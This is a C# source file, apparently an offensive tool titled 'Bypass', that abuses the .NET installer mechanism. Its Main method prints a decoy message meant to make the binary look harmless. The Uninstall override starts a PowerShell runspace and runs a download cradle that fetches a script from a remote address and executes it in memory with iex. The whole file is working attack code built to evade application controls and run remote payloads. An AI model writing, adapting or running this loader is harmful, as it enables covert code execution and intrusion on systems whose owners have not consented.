using System; // Provides basic system functionalities
using System.Management.Automation; // Namespace for working with PowerShell
using System.Management.Automation.Runspaces; // Namespace for creating and managing PowerShell runspaces
using System.Configuration.Install; // Namespace for handling custom actions during installation/uninstallation

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            // A simple placeholder message for misleading purposes
            // This makes the binary appear benign during casual inspection
            Console.WriteLine("Nothing going on in this binary.");
        }
    }

    // Indicates that this class is an installer and should be executed during installation/uninstallation
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        // Overrides the default Uninstall method to inject malicious behavior
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // Define a PowerShell command to download and execute a remote script
            // This command fetches a PowerShell script from a remote server and executes it in memory using 'iex'
            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.93.128/run.txt') | iex";

            // Create a new PowerShell runspace to execute the malicious command
            Runspace rs = RunspaceFactory.CreateRunspace(); // Initializes a new runspace
            rs.Open(); // Opens the runspace for execution

            // Create a PowerShell instance and bind it to the runspace
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs; // Assign the runspace to the PowerShell instance

            // Add the malicious script (cmd) to the PowerShell instance
            ps.AddScript(cmd);

            // Execute the PowerShell command
            ps.Invoke();

            // Close the runspace after execution
            rs.Close();
        }
    }
}
